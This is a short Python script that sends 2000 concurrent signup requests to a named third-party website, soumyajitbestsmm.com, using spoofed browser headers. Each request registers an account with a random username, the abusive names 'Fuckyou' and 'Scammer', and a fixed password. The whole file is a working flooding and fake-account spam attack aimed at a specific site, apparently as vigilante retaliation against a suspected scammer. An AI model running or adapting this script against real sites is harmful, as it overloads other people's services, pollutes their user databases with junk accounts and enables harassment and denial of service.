import requests
import random
import string
import threading

headers = {
    'Host': 'soumyajitbestsmm.com',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://soumyajitbestsmm.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Sec-Gpc': '1',
    'Accept-Language': 'en-US,en;q=0.8',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://soumyajitbestsmm.com/signup',
}

def send_request():
    # generate a random username and email
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = username + '@example.com'
    
    # create the data for the request
    data = {
        'username': username,
        'first_name': 'Fuckyou',
        'last_name': 'Scammer',
        'email': email,
        'password': 'HailAmdusias',
        'password_again': 'HailAmdusias',
        'terms': '1',
    }

    # send the request
    response = requests.post('https://soumyajitbestsmm.com/signup', headers=headers, data=data)
    print(f'Response: {response.status_code}')

threads = []
for i in range(2000):
    thread = threading.Thread(target=send_request)
    threads.append(thread)

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
